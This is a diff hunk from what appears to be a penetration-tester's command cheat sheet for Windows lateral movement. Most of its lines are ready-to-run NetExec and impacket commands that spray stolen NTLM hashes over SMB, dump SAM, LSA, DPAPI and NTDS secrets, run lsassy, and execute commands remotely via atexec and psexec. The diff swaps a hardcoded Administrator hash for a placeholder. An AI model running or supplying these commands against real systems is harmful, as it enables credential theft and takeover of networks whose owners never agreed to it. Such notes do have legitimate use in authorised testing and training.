@@ -629,10 +629,10 @@ DUMP=''
 echo "$DUMP" | cut -d ':' -f 1 >> usernames; sort -u usernames | tee usernames
 echo "$DUMP" | cut -d ':' -f 3- | sed 's/::.*//' >> hashes; sort -u hashes | tee hashes
 
-proxychains nxc smb 10.10.10.1 10.10.10.2 -u usernames -H hashes --local-auth
+proxychains nxc smb 10.10.10.1 10.10.10.2 -u usernames -H hashes --local-auth --continue-on-success | grep '\[+\]'
 proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam | grep ':[0-9]\+:[a-f0-9]\{32\}:[a-f0-9]\{32\}:::' | awk '{print $NF}'
 proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth --sam --lsa --dpapi --ntds
-proxychains nxc smb 10.10.10.2 -u 'Administrator' -H '6aa6bca0dafa60871fa5ecaf2217e05f' --local-auth -M reg-winlogon -M lsassy -M powershell_history
+proxychains nxc smb 10.10.10.2 -u '$USERNAME' -H '$HASH' --local-auth -M reg-winlogon -M lsassy -M powershell_history
 
 impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
 impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
